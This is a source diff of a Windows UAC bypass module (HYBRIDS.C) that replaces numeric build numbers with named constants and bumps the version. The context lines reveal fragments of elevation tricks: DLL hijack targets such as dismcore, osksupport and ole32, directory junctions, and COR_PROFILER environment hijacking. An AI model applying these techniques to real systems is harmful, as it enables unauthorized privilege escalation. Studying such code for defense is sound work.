@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2020
+*  (C) COPYRIGHT AUTHORS, 2015 - 2021
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.53
+*  VERSION:     3.55
 *
-*  DATE:        07 Nov 2020
+*  DATE:        02 Mar 2021
 *
 *  Hybrid UAC bypass methods.
 *
@@ -388,7 +388,7 @@ NTSTATUS ucmDismMethod(
     SIZE_T  nLen;
     WCHAR   szSource[MAX_PATH * 2];
 
-    if (g_ctx->dwBuildNumber < 19041) {
+    if (g_ctx->dwBuildNumber < NT_WIN10_20H1) {
         lpTargetDll = DISMCORE_DLL;
     }
     else {
@@ -482,7 +482,7 @@ NTSTATUS ucmUiAccessMethod(
         //
         // There is no osksupport.dll in Windows 7.
         //
-        if (g_ctx->dwBuildNumber < 9200)
+        if (g_ctx->dwBuildNumber < NT_WIN8_RTM)
             lpTargetDll = DUSER_DLL;
         else
             lpTargetDll = OSKSUPPORT_DLL;
@@ -604,7 +604,7 @@ NTSTATUS ucmJunctionMethodPreNetfx48(
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx->szTempDirectory);
 
-        if (g_ctx->dwBuildNumber < 9600) {
+        if (g_ctx->dwBuildNumber < NT_WIN8_BLUE) {
             _strcat(szSource, OLE32_DLL);
         }
         else {
@@ -743,7 +743,7 @@ NTSTATUS ucmJunctionMethod(
 
     do {
 
-        if (g_ctx->dwBuildNumber < 19041) {
+        if (g_ctx->dwBuildNumber < NT_WIN10_20H1) {
             lpTargetDll = DISMCORE_DLL;
         }
         else {
@@ -817,7 +817,7 @@ BOOL ucmJunctionMethodCleanup(
 
     do {
 
-        if (g_ctx->dwBuildNumber < 9600) {
+        if (g_ctx->dwBuildNumber < NT_WIN8_BLUE) {
             lpTargetDll = OLE32_DLL;
         }
         else {
@@ -1094,7 +1094,7 @@ NTSTATUS ucmCorProfilerMethod(
         supSetEnvVariable(FALSE, NULL, COR_ENABLE_PROFILING, TEXT("1"));
         supSetEnvVariable(FALSE, NULL, COR_PROFILER, OutputGuidString);
 
-        if (g_ctx->dwBuildNumber >= 9200) {
+        if (g_ctx->dwBuildNumber >= NT_WIN8_RTM) {
             supSetEnvVariable(FALSE, NULL, COR_PROFILER_PATH, szBuffer);
         }
         else {
@@ -1159,7 +1159,7 @@ NTSTATUS ucmCorProfilerMethod(
 
     supSetEnvVariable(TRUE, NULL, COR_ENABLE_PROFILING, NULL);
 
-    if (g_ctx->dwBuildNumber >= 9200)
+    if (g_ctx->dwBuildNumber >= NT_WIN8_RTM)
         supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);
 
     return MethodResult;
